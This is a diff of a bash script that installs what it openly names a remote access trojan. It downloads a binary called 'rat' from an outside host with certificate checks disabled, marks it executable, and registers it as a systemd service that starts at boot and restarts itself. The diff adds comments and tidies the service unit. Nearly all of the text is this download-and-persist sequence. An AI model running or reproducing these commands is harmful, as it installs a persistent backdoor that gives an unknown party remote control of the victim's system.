@@ -1,7 +1,11 @@
 #!/bin/bash
+
+# download
 cd /home
 wget --no-check-certificate https://raw.minecraftbe.org/imByteCat/fast-rat/master/linux/rat
 chmod +x rat
+
+# register service
 cat > "/etc/systemd/system/rat.service" << EOF
 [Unit]
 Description=RAT Service
@@ -17,9 +21,9 @@ RestartSec=5s
 
 [Install]
 WantedBy=multi-user.target
-Restart=on-failure
-RestartSec=5s
 EOF
+
+# reload service
 systemctl daemon-reload
 systemctl start rat
 systemctl enable rat
